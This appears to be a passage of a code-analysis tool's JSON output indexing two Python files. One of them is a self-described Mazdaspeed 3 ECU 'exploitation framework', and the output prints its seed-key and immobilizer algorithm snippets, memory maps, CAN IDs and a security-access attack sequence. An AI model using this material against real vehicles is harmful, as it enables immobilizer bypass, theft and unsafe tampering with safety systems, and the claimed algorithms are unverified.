"password_hash, _ = self._hash_password(new_password, salt)"}, {"type": "security_pattern", "line": 892, "pattern": "hash", "content": "password_hash, _ = self._hash_password(new_password, salt)"}, {"type": "security_pattern", "line": 893, "pattern": "password", "content": "set_clause += \", password_hash = ?, password_salt = ?\""}, {"type": "security_pattern", "line": 893, "pattern": "hash", "content": "set_clause += \", password_hash = ?, password_salt = ?\""}, {"type": "security_pattern", "line": 900, "pattern": "password", "content": "if new_password:"}, {"type": "security_pattern", "line": 901, "pattern": "password", "content": "params.extend([password_hash, salt])"}, {"type": "security_pattern", "line": 901, "pattern": "hash", "content": "params.extend([password_hash, salt])"}, {"type": "security_pattern", "line": 1151, "pattern": "key", "content": "set_clause = \", \".join(f\"{field} = ?\" for field in updates.keys())"}, {"type": "security_pattern", "line": 1260, "pattern": "encrypt", "content": "config_encrypted = self._encrypt_json(config)"}, {"type": "security_pattern", "line": 1265, "pattern": "encrypt", "content": "notes, config_encrypted, is_complete"}, {"type": "security_pattern", "line": 1273, "pattern": "encrypt", "content": "config_encrypted,"}, {"type": "security_pattern", "line": 1313, "pattern": "encrypt", "content": "description, notes, config_encrypted, is_complete"}, {"type": "security_pattern", "line": 1322, "pattern": "encrypt", "content": "config_encrypted = result[7]"}, {"type": "security_pattern", "line": 1323, "pattern": "encrypt", "content": "config = self._decrypt_json(config_encrypted) if config_encrypted else {}"}, {"type": "security_pattern", "line": 1323, "pattern": "decrypt", "content": "config = self._decrypt_json(config_encrypted) if config_encrypted else {}"}, {"type": "security_pattern", "line": 1370, "pattern": "encrypt", "content": "description, notes, config_encrypted, is_complete"}, {"type": "security_pattern", "line": 1400, "pattern": "encrypt", "content": "config_encrypted = row[7]"}, {"type": "security_pattern", "line": 1401, "pattern": "encrypt", "content": "config = self._decrypt_json(config_encrypted) if config_encrypted else {}"}, {"type": "security_pattern", "line": 1401, "pattern": "decrypt", "content": "config = self._decrypt_json(config_encrypted) if config_encrypted else {}"}, {"type": "security_pattern", "line": 1452, "pattern": "encrypt", "content": "updates['config_encrypted'] = self._encrypt_json(config)"}, {"type": "security_pattern", "line": 1460, "pattern": "encrypt", "content": "f\"{field} = ?\" if field != 'config_encrypted' else 'config_encrypted = ?'"}, {"type": "security_pattern", "line": 1461, "pattern": "key", "content": "for field in updates.keys()"}, {"type": "security_pattern", "line": 1487, "pattern": "key", "content": "details={\"updated_fields\": list(updates.keys())}"}, {"type": "security_pattern", "line": 1599, "pattern": "encrypt", "content": "data_encrypted = self._encrypt_json(data)"}, {"type": "security_pattern", "line": 1603, "pattern": "encrypt", "content": "session_id, timestamp, code, description, severity, data_encrypted"}, {"type": "security_pattern", "line": 1611, "pattern": "encrypt", "content": "data_encrypted"}, {"type": "security_pattern", "line": 1669, "pattern": "encrypt", "content": "severity, data_encrypted"}, {"type": "security_pattern", "line": 1707, "pattern": "encrypt", "content": "data_encrypted = row[6]"}, {"type": "security_pattern", "line": 1708, "pattern": "encrypt", "content": "data = self._decrypt_json(data_encrypted) if data_encrypted else {}"}, {"type": "security_pattern", "line": 1708, "pattern": "decrypt", "content": "data = self._decrypt_json(data_encrypted) if data_encrypted else {}"}, {"type": "security_pattern", "line": 1837, "pattern": "encrypt", "content": "details_encrypted = self._encrypt_json(details)"}, {"type": "security_pattern", "line": 1842, "pattern": "encrypt", "content": "description, details_encrypted"}, {"type": "security_pattern", "line": 1850, "pattern": "encrypt", "content": "details_encrypted"}, {"type": "security_pattern", "line": 1895, "pattern": "encrypt", "content": "description, details_encrypted"}, {"type": "security_pattern", "line": 1933, "pattern": "encrypt", "content": "details_encrypted = row[6]"}, {"type": "security_pattern", "line": 1934, "pattern": "encrypt", "content": "details = self._decrypt_json(details_encrypted) if details_encrypted else {}"}, {"type": "security_pattern", "line": 1934, "pattern": "decrypt", "content": "details = self._decrypt_json(details_encrypted) if details_encrypted else {}"}, {"type": "security_pattern", "line": 2087, "pattern": "key", "content": "db = SecureDatabase(\"secure_tunes.db\", encryption_key=b\"your-secret-key-here\")"}, {"type": "security_pattern", "line": 2087, "pattern": "encrypt", "content": "db = SecureDatabase(\"secure_tunes.db\", encryption_key=b\"your-secret-key-here\")"}, {"type": "security_pattern", "line": 2093, "pattern": "password", "content": "password=\"securepassword123\","}], "dead_or_disabled_code": [], "risks": [{"type": "security_risk", "line": 2004, "risk": "tempfile", "content": "import tempfile"}, {"type": "security_risk", "line": 2006, "risk": "tempfile", "content": "temp_dir = tempfile.mkdtemp()"}], "group_tags": ["other"]}
{"file_path": "add1.py", "lines_read": 456, "features_found": [{"type": "function", "name": "main", "line": 389}, {"type": "function", "name": "__init__", "line": 18}, {"type": "function", "name": "reverse_engineer_seed_key", "line": 23}, {"type": "function", "name": "_mazda_27_algorithm", "line": 50}, {"type": "function", "name": "_mazda_tcm_algorithm", "line": 64}, {"type": "function", "name": "_mazda_immobilizer_algorithm", "line": 77}, {"type": "function", "name": "_derive_vin_key", "line": 91}, {"type": "function", "name": "map_ecu_memory", "line": 102}, {"type": "function", "name": "__init__", "line": 130}, {"type": "function", "name": "define_safety_limits", "line": 135}, {"type": "function", "name": "real_time_optimization", "line": 147}, {"type": "function", "name": "_optimize_timing", "line": 164}, {"type": "function", "name": "_optimize_boost", "line": 182}, {"type": "function", "name": "_optimize_fuel", "line": 198}, {"type": "function", "name": "_optimize_vvt", "line": 213}, {"type": "function", "name": "_apply_safety_limits", "line": 225}, {"type": "function", "name": "_learn_from_optimization", "line": 242}, {"type": "function", "name": "__init__", "line": 260}, {"type": "function", "name": "enumerate_j2534_exploits", "line": 264}, {"type": "function", "name": "execute_memory_dump", "line": 290}, {"type": "function", "name": "_build_read_memory_payload", "line": 311}, {"type": "function", "name": "__init__", "line": 326}, {"type": "function", "name": "enumerate_ecu_ids", "line": 330}, {"type": "function", "name": "inject_diagnostic_session", "line": 341}, {"type": "function", "name": "security_access_attack", "line": 357}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}], "components_found": [{"type": "class", "name": "MazdaECUExploit", "line": 15}, {"type": "class", "name": "AutonomousTuner", "line": 127}, {"type": "class", "name": "DiagnosticExploits", "line": 257}, {"type": "class", "name": "CANInjection", "line": 323}], "algorithms": [{"type": "algorithm_function", "line": 50, "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 64, "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 77, "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 91, "content": "def _derive_vin_key(self):"}], "protocols": [{"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "'description': 'Main ECU security access (0x27)',"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 73, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 106, "protocol": "0x[0-9A-Fa-f]+", "content": "'ignition_timing': {'address': 0xFFA000, 'size': 0x800, 'description': '16x16 ignition map'},"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_maps': {'address': 0xFFA800, 'size': 0x800, 'description': '16x16 fuel map'},"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_control': {'address': 0xFFB000, 'size': 0x400, 'description': 'Boost target maps'},"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_maps': {'address': 0xFFB400, 'size': 0x400, 'description': 'Variable valve timing'},"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limit': {'address': 0xFFB800, 'size': 0x100, 'description': 'RPM limiters'},"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "'speed_limit': {'address': 0xFFB900, 'size': 0x100, 'description': 'Speed governor'}"}, {"type": "protocol", "line": 114, "protocol": "0x[0-9A-Fa-f]+", "content": "'knock_learn': {'address': 0xFFC000, 'size': 0x200, 'description': 'Knock adaptation'},"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_trim': {'address': 0xFFC200, 'size': 0x200, 'description': 'Long/short term fuel trims'},"}, {"type": "protocol", "line": 116, "protocol": "0x[0-9A-Fa-f]+", "content": "'throttle_adapt': {'address': 0xFFC400, 'size': 0x100, 'description': 'Throttle body learning'},"}, {"type": "protocol", "line": 117, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_adapt': {'address': 0xFFC500, 'size': 0x300, 'description': 'Transmission adaptation'}"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "'bootloader': {'address': 0xFF0000, 'size': 0x1000, 'description': 'Boot sector - reprogramming'},"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "'security_registers': {'address': 0xFFFF00, 'size': 0x100, 'description': 'Security access control'}"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "'checksum_area': {'address': 0xFFFFF0, 'size': 0x10, 'description': 'ECU checksums'}"}, {"type": "protocol", "line": 262, "protocol": "CAN", "content": "self.can_injection = CANInjection()"}, {"type": "protocol", "line": 265, "protocol": "J2534", "content": "\"\"\"J2534 PROTOCOL VULNERABILITIES\"\"\""}, {"type": "protocol", "line": 270, "protocol": "CAN", "content": "'exploit': 'CAN ID spoofing + sequence number prediction'"}, {"type": "protocol", "line": 275, "protocol": "0x[0-9A-Fa-f]+", "content": "'exploit': 'Exploit 0x23 0x2A 0x3D services'"}, {"type": "protocol", "line": 279, "protocol": "0x[0-9A-Fa-f]+", "content": "'target': '0x27 security service',"}, {"type": "protocol", "line": 312, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"BUILD 0x23 READ MEMORY PAYLOAD\"\"\""}, {"type": "protocol", "line": 315, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x23)  # Service ID"}, {"type": "protocol", "line": 323, "protocol": "CAN", "content": "class CANInjection:"}, {"type": "protocol", "line": 324, "protocol": "CAN", "content": "\"\"\"ADVANCED CAN BUS MESSAGE INJECTION\"\"\""}, {"type": "protocol", "line": 331, "protocol": "CAN", "content": "\"\"\"MAZDASPEED 3 SPECIFIC CAN IDENTIFIERS\"\"\""}, {"type": "protocol", "line": 333, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine_ecu': 0x7E0,"}, {"type": "protocol", "line": 334, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm': 0x7E1,"}, {"type": "protocol", "line": 335, "protocol": "0x[0-9A-Fa-f]+", "content": "'abs': 0x7E2,"}, {"type": "protocol", "line": 336, "protocol": "0x[0-9A-Fa-f]+", "content": "'airbag': 0x7E3,"}, {"type": "protocol", "line": 337, "protocol": "0x[0-9A-Fa-f]+", "content": "'cluster': 0x7E4,"}, {"type": "protocol", "line": 338, "protocol": "0x[0-9A-Fa-f]+", "content": "'immobilizer': 0x7E5"}, {"type": "protocol", "line": 345, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x10)  # Service"}, {"type": "protocol", "line": 362, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x01]),  # Request seed"}, {"type": "protocol", "line": 379, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x02]) + bytes.fromhex(key),  # Send key"}], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "FULL SECURITY BYPASS & AUTONOMOUS TUNING FOR STOCK 2011 MAZDASPEED 3"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "class MazdaECUExploit:"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "\"\"\"COMPLETE MAZDASPEED 3 ECU EXPLOITATION FRAMEWORK\"\"\""}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "self.security_level = \"FACTORY_DEALER_ACCESS\""}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "self.ecu_memory_map = self.map_ecu_memory()"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "'ecu_access_27': {"}, {"type": "hardware", "line": 27, "hardware": "ECU", "content": "'description': 'Main ECU security access (0x27)',"}, {"type": "hardware", "line": 33, "hardware": "TCM", "content": "'tcm_access_27': {"}, {"type": "hardware", "line": 35, "hardware": "TCM", "content": "'algorithm': self._mazda_tcm_algorithm,"}, {"type": "hardware", "line": 40, "hardware": "immobilizer", "content": "'immobilizer_27': {"}, {"type": "hardware", "line": 41, "hardware": "immobilizer", "content": "'description': 'Immobilizer system access',"}, {"type": "hardware", "line": 42, "hardware": "immobilizer", "content": "'algorithm': self._mazda_immobilizer_algorithm,"}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "hardware", "line": 64, "hardware": "TCM", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "hardware", "line": 65, "hardware": "TCM", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "hardware", "line": 77, "hardware": "immobilizer", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "hardware", "line": 78, "hardware": "immobilizer", "content": "\"\"\"IMMOBILIZER ALGORITHM - TRIPLE DES BASED\"\"\""}, {"type": "hardware", "line": 92, "hardware": "immobilizer", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "hardware", "line": 93, "hardware": "ECU", "content": "vin = self._read_vin()  # Read VIN from ECU"}, {"type": "hardware", "line": 98, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "def map_ecu_memory(self):"}, {"type": "hardware", "line": 103, "hardware": "ECU", "content": "\"\"\"COMPLETE MEMORY MAP OF MZR DISI ECU\"\"\""}, {"type": "hardware", "line": 117, "hardware": "TCM", "content": "'tcm_adapt': {'address': 0xFFC500, 'size': 0x300, 'description': 'Transmission adaptation'}"}, {"type": "hardware", "line": 119, "hardware": "ECU", "content": "'security_areas': {"}, {"type": "hardware", "line": 121, "hardware": "ECU", "content": "'security_registers': {'address': 0xFFFF00, 'size': 0x100, 'description': 'Security access control'}"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "'checksum_area': {'address': 0xFFFFF0, 'size': 0x10, 'description': 'ECU checksums'}"}, {"type": "hardware", "line": 273, "hardware": "ECU", "content": "'method': 'Dump entire ECU memory via extended diagnostics',"}, {"type": "hardware", "line": 274, "hardware": "ECU", "content": "'target': 'ECU flash memory',"}, {"type": "hardware", "line": 277, "hardware": "ECU", "content": "'security_bypass': {"}, {"type": "hardware", "line": 278, "hardware": "ECU", "content": "'method': 'Bypass security access without valid key',"}, {"type": "hardware", "line": 279, "hardware": "ECU", "content": "'target': '0x27 security service',"}, {"type": "hardware", "line": 283, "hardware": "ECU", "content": "'method': 'Compromise ECU bootloader for permanent access',"}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "'target': 'Boot sector of ECU',"}, {"type": "hardware", "line": 290, "hardware": "ECU", "content": "def execute_memory_dump(self):"}, {"type": "hardware", "line": 291, "hardware": "ECU", "content": "\"\"\"DUMP COMPLETE ECU MEMORY VIA DIAGNOSTIC EXPLOIT\"\"\""}, {"type": "hardware", "line": 295, "hardware": "ECU", "content": "for area_name, area_info in MazdaECUExploit().ecu_memory_map.items():"}, {"type": "hardware", "line": 324, "hardware": "CAN bus", "content": "\"\"\"ADVANCED CAN BUS MESSAGE INJECTION\"\"\""}, {"type": "hardware", "line": 328, "hardware": "ECU", "content": "self.ecu_ids = self.enumerate_ecu_ids()"}, {"type": "hardware", "line": 330, "hardware": "ECU", "content": "def enumerate_ecu_ids(self):"}, {"type": "hardware", "line": 333, "hardware": "ECU", "content": "'engine_ecu': 0x7E0,"}, {"type": "hardware", "line": 334, "hardware": "TCM", "content": "'tcm': 0x7E1,"}, {"type": "hardware", "line": 335, "hardware": "ABS", "content": "'abs': 0x7E2,"}, {"type": "hardware", "line": 338, "hardware": "immobilizer", "content": "'immobilizer': 0x7E5"}, {"type": "hardware", "line": 341, "hardware": "ECU", "content": "def inject_diagnostic_session(self, target_ecu, session_type):"}, {"type": "hardware", "line": 349, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 355, "hardware": "ECU", "content": "return f\"Started {session_type} session on {target_ecu}\""}, {"type": "hardware", "line": 357, "hardware": "ECU", "content": "def security_access_attack(self, target_ecu):"}, {"type": "hardware", "line": 358, "hardware": "ECU", "content": "\"\"\"AUTOMATED SECURITY ACCESS ATTACK\"\"\""}, {"type": "hardware", "line": 361, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "hardware", "line": 378, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target_ecu],"}, {"type": "hardware", "line": 384, "hardware": "ECU", "content": "return f\"Security access granted to {target_ecu}\""}, {"type": "hardware", "line": 386, "hardware": "ECU", "content": "return \"Security access failed\""}, {"type": "hardware", "line": 390, "hardware": "ECU", "content": "print(\"MAZDASPEED 3 COMPLETE SECURITY & TUNING EXPLOITATION\")"}, {"type": "hardware", "line": 394, "hardware": "ECU", "content": "ecu_exploit = MazdaECUExploit()"}, {"type": "hardware", "line": 399, "hardware": "ECU", "content": "print(\"\\n1. ECU SECURITY ACCESS BYPASS\")"}, {"type": "hardware", "line": 403, "hardware": "ECU", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "hardware", "line": 407, "hardware": "ECU", "content": "print(\"\\n2. ECU MEMORY MAP EXPLOITATION\")"}, {"type": "hardware", "line": 409, "hardware": "ECU", "content": "for area_name, area in ecu_exploit.ecu_memory_map.items():"}, {"type": "hardware", "line": 450, "hardware": "ECU", "content": "dump_payloads = diagnostic_exploits.execute_memory_dump()"}], "security_logic": [{"type": "security_pattern", "line": 11, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 12, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 12, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 19, "pattern": "key", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 19, "pattern": "seed", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 19, "pattern": "algorithm", "content": "self.ecu_seed_key_algorithms = self.reverse_engineer_seed_key()"}, {"type": "security_pattern", "line": 23, "pattern": "key", "content": "def reverse_engineer_seed_key(self):"}, {"type": "security_pattern", "line": 23, "pattern": "seed", "content": "def reverse_engineer_seed_key(self):"}, {"type": "security_pattern", "line": 24, "pattern": "key", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 24, "pattern": "seed", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 24, "pattern": "algorithm", "content": "\"\"\"REVERSE ENGINEERED MAZDA SEED-KEY ALGORITHMS FROM FACTORY TOOLS\"\"\""}, {"type": "security_pattern", "line": 25, "pattern": "algorithm", "content": "algorithms = {"}, {"type": "security_pattern", "line": 28, "pattern": "algorithm", "content": "'algorithm': self._mazda_27_algorithm,"}, {"type": "security_pattern", "line": 29, "pattern": "seed", "content": "'seed_bytes': 4,"}, {"type": "security_pattern", "line": 30, "pattern": "key", "content": "'key_bytes': 4,"}, {"type": "security_pattern", "line": 35, "pattern": "algorithm", "content": "'algorithm': self._mazda_tcm_algorithm,"}, {"type": "security_pattern", "line": 36, "pattern": "seed", "content": "'seed_bytes': 2,"}, {"type": "security_pattern", "line": 37, "pattern": "key", "content": "'key_bytes': 2,"}, {"type": "security_pattern", "line": 42, "pattern": "algorithm", "content": "'algorithm': self._mazda_immobilizer_algorithm,"}, {"type": "security_pattern", "line": 43, "pattern": "seed", "content": "'seed_bytes': 8,"}, {"type": "security_pattern", "line": 44, "pattern": "key", "content": "'key_bytes': 8,"}, {"type": "security_pattern", "line": 45, "pattern": "key", "content": "'vulnerability': 'DES with weak key derivation'"}, {"type": "security_pattern", "line": 48, "pattern": "algorithm", "content": "return algorithms"}, {"type": "security_pattern", "line": 50, "pattern": "seed", "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "security_pattern", "line": 51, "pattern": "algorithm", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "security_pattern", "line": 53, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 54, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 58, "pattern": "key", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 58, "pattern": "seed", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "security_pattern", "line": 59, "pattern": "key", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "security_pattern", "line": 60, "pattern": "key", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 62, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 64, "pattern": "seed", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "security_pattern", "line": 64, "pattern": "algorithm", "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "security_pattern", "line": 65, "pattern": "algorithm", "content": "\"\"\"TCM SECURITY ALGORITHM - SIMPLER VERSION\"\"\""}, {"type": "security_pattern", "line": 66, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 67, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 70, "pattern": "key", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 70, "pattern": "seed", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 71, "pattern": "seed", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 72, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 73, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 75, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 77, "pattern": "seed", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "security_pattern", "line": 77, "pattern": "algorithm", "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "security_pattern", "line": 78, "pattern": "algorithm", "content": "\"\"\"IMMOBILIZER ALGORITHM - TRIPLE DES BASED\"\"\""}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "vin_key = self._derive_vin_key()"}, {"type": "security_pattern", "line": 81, "pattern": "seed", "content": "seed_bytes = bytes.fromhex(seed)"}, {"type": "security_pattern", "line": 84, "pattern": "key", "content": "des_key = vin_key[:8]  # Use first 8 bytes of derived key"}, {"type": "security_pattern", "line": 85, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 85, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 85, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 86, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 86, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 87, "pattern": "key", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 87, "pattern": "encrypt", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 87, "pattern": "seed", "content": "key = encryptor.update(seed_bytes) + encryptor.finalize()"}, {"type": "security_pattern", "line": 89, "pattern": "key", "content": "return key.hex().upper()"}, {"type": "security_pattern", "line": 91, "pattern": "key", "content": "def _derive_vin_key(self):"}, {"type": "security_pattern", "line": 92, "pattern": "key", "content": "\"\"\"DERIVE VIN-BASED KEY FOR IMMOBILIZER\"\"\""}, {"type": "security_pattern", "line": 97, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 97, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 98, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 98, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt').digest()"}, {"type": "security_pattern", "line": 100, "pattern": "key", "content": "return key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 148, "pattern": "algorithm", "content": "\"\"\"REAL-TUNE AI TUNING ALGORITHM\"\"\""}, {"type": "security_pattern", "line": 278, "pattern": "key", "content": "'method': 'Bypass security access without valid key',"}, {"type": "security_pattern", "line": 280, "pattern": "key", "content": "'exploit': 'Timing attack on seed-key validation'"}, {"type": "security_pattern", "line": 280, "pattern": "seed", "content": "'exploit': 'Timing attack on seed-key validation'"}, {"type": "security_pattern", "line": 357, "pattern": "security_access", "content": "def security_access_attack(self, target_ecu):"}, {"type": "security_pattern", "line": 360, "pattern": "seed", "content": "seed_msg = can.Message("}, {"type": "security_pattern", "line": 362, "pattern": "seed", "content": "data=bytes([0x27, 0x01]),  # Request seed"}, {"type": "security_pattern", "line": 365, "pattern": "seed", "content": "self.bus.send(seed_msg)"}, {"type": "security_pattern", "line": 371, "pattern": "seed", "content": "seed_response = self._receive_seed()"}, {"type": "security_pattern", "line": 372, "pattern": "seed", "content": "if seed_response:"}, {"type": "security_pattern", "line": 373, "pattern": "seed", "content": "seed = seed_response[2:6]  # Extract seed bytes"}, {"type": "security_pattern", "line": 374, "pattern": "key", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 374, "pattern": "seed", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 374, "pattern": "algorithm", "content": "key = MazdaECUExploit()._mazda_27_algorithm(seed.hex())"}, {"type": "security_pattern", "line": 377, "pattern": "key", "content": "key_msg = can.Message("}, {"type": "security_pattern", "line": 379, "pattern": "key", "content": "data=bytes([0x27, 0x02]) + bytes.fromhex(key),  # Send key"}, {"type": "security_pattern", "line": 382, "pattern": "key", "content": "self.bus.send(key_msg)"}, {"type": "security_pattern", "line": 402, "pattern": "seed", "content": "test_seed = \"A1B2C3D4\""}, {"type": "security_pattern", "line": 403, "pattern": "key", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 403, "pattern": "seed", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 403, "pattern": "algorithm", "content": "calculated_key = ecu_exploit._mazda_27_algorithm(test_seed)"}, {"type": "security_pattern", "line": 404, "pattern": "key", "content": "print(f\"Seed: {test_seed} -> Key: {calculated_key}\")"}, {"type": "security_pattern", "line": 404, "pattern": "seed", "content": "print(f\"Seed: {test_seed} -> Key: {calculated_key}\")"}], "dead_or_disabled_code": [], "risks": [], 